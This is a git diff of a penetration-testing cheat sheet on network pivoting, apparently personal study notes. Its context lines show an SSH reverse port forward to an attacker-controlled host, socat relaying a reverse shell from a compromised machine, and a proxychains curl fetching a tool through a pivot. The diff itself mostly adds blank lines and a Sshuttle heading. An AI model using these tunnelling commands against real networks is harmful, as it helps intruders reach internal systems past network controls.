@@ -133,6 +133,9 @@ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
 
+
+
+
 # Socat
 
 socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
@@ -162,6 +165,10 @@ socks4 127.0.0.1 9000
 ```
 proxychains curl http://10.50.88.33:8080/socat_sardarji -o socat_sardarji
 ```
+
+
+
+
 
 
 # Chisel 
@@ -230,3 +237,8 @@ Attacker
 ```
 
 
+
+
+
+
+## Sshuttle
